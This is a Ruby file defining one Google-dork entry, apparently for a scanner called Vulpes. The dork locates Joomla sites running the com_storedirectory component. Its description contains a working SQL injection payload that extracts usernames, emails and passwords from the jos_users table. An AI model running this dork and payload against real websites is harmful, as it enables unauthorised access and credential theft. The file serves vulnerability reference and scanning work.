module Dorks
   class Dork3621 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3621",
            ghdb_url: "https://www.exploit-db.com/ghdb/3621",
            severity: "5",
            category: "advisories_and_vulnerabilities.sqli",
            publish_date: "2010-11-25",
            author: "anonymous",
            dork: <<~EDORK,
inurl:"index.php?option=com_storedirectory"
EDORK
            description: <<~EDESC
SQL Injection Vulnerability: http://127.0.0.1/index.php?option=com_storedirectory&task=view&id=-16 UNION SELECT 1,2,concat_ws(0x3a,username,email,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from jos_users Author: Ashiyane Digital Security Team
EDESC
         })

      end
   end
end
